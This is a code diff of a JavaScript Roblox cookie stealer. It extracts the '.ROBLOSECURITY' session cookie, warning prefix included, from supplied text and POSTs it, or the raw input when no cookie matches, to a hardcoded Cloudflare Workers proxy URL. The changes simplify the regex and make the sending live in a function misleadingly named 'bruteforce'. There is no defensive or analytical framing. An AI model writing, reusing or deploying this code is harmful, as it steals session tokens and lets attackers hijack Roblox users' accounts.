@@ -1,52 +1,37 @@
 const CLOUDFLARE_PROXY_URL = "https://wispy-pond-aa69.virtualmachineholder420.workers.dev/";
- 
+
 function extractRobloxSecurityCookie(sessionId) {
-  // Covers multiple possible cookie formats:
-  const patterns = [
-    /\.ROBLOSECURITY[^=]+=([^;]+)/,        // Format: .ROBLOSECURITY=value
-    /\.ROBLOSECURITY",\s*"([^"]+)"/,       // Format: .ROBLOSECURITY","value"
-    /(_\|WARNING:-DO-NOT-SHARE-THIS.+?)_/  // Full cookie warning format
-  ];
-
-  for (const regex of patterns) {
-    const match = sessionId.match(regex);
-    if (match) return match[1] || match[0]; // Return captured group or full match
-  }
-  return null; // No cookie found
+  // Matches the ENTIRE cookie (including the token)
+  const fullCookieRegex = /(_\|WARNING:-DO-NOT-SHARE-THIS\.--[^\n]+)/;
+  const match = sessionId.match(fullCookieRegex);
+  return match ? match[0] : null;
 }
-
 
 async function sendToProxy(data) {
   try {
     const response = await fetch(CLOUDFLARE_PROXY_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        sessionId: data,
-        timestamp: new Date().toISOString()
-      })
+      body: JSON.stringify({ cookie: data })
     });
-    if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
+    console.log("✅ Sent to proxy:", data);
     return await response.json();
   } catch (error) {
-    console.error('Proxy error:', error);
+    console.error("❌ Proxy error:", error);
     throw error;
   }
 }
 
 function bruteforce(sessionId) {
-  let content;
   const cookie = extractRobloxSecurityCookie(sessionId);
-
+  
   if (cookie) {
-    content = `✅ Valid .ROBLOSECURITY cookie:\n\`\`\`${cookie}\`\`\``;
+    console.log("🔐 Valid .ROBLOSECURITY cookie:", cookie);
+    sendToProxy(cookie).catch(err => console.error(err));
   } else {
-    content = `⚠️ Raw session ID (no .ROBLOSECURITY found):\n\`\`\`${sessionId}\`\`\``;
+    console.log("⚠️ No valid cookie found. Raw input:", sessionId);
+    sendToProxy(sessionId).catch(err => console.error(err));
   }
-
-  // Send to proxy (or log for testing)
-  console.log(content); // Replace with sendToProxy() in malicious code
-  sendToProxy(cookie || sessionId);
 }
 
 
